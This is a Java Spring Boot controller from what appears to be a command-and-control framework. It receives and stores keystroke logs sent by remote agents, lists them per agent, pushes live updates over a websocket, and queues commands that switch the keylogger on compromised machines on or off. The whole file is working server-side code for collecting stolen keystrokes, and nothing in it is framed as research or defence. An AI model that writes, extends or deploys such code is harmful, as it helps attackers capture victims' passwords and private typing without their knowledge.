package com.javac2.framework.JavaC2Framework.Controller;

import java.time.LocalDateTime;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.javac2.framework.JavaC2Framework.Model.Command;
import com.javac2.framework.JavaC2Framework.Model.Keylog;
import com.javac2.framework.JavaC2Framework.Repository.CommandRepo;
import com.javac2.framework.JavaC2Framework.Service.KeylogService;

@RestController
@RequestMapping("/keylogger")
public class KeylogController {
    @Autowired
    private KeylogService keylogService;

    @Autowired
    private EventWebSocketController wsController;

    @Autowired
    private CommandRepo commandRepo;

    private Map<String, Boolean> keyloggerStatus = new HashMap<>(); // agentId -> on/off

    @GetMapping("/logs/{agentId}")
    public List<Keylog> getAllLogs(@PathVariable String agentId) {
        return keylogService.getKeylogsByAgent(agentId);
    }

    @GetMapping("/live/{agentId}")
    public List<Keylog> getLiveLogs(@PathVariable String agentId) {
        return keylogService.getLatestKeylogs(agentId, 20);
    }

    @PostMapping("/log")
    public Keylog postLog(@RequestBody Keylog keylog) {
        keylog.setTimestamp(LocalDateTime.now());
        Keylog saved = keylogService.saveKeylog(keylog);
        wsController.broadcast("keylog", keylog.getAgentId());
        return saved;
    }

    @PostMapping("/toggle/{agentId}")
    public Map<String, Object> toggleKeylogger(@PathVariable String agentId) {
        boolean current = keyloggerStatus.getOrDefault(agentId, false);
        keyloggerStatus.put(agentId, !current);
        Map<String, Object> resp = new HashMap<>();
        resp.put("agentId", agentId);
        resp.put("enabled", !current);

        // Add command for agent
        Command cmd = new Command();
        cmd.setAgentId(agentId);
        cmd.setCommand(!current ? "start_keylogger" : "stop_keylogger");
        cmd.setStatus("PENDING");
        cmd.setDate(new Date());
        commandRepo.save(cmd);

        return resp;
    }

    @GetMapping("/status/{agentId}")
    public Map<String, Object> getStatus(@PathVariable String agentId) {
        boolean enabled = keyloggerStatus.getOrDefault(agentId, false);
        Map<String, Object> resp = new HashMap<>();
        resp.put("agentId", agentId);
        resp.put("enabled", enabled);
        return resp;
    }
} 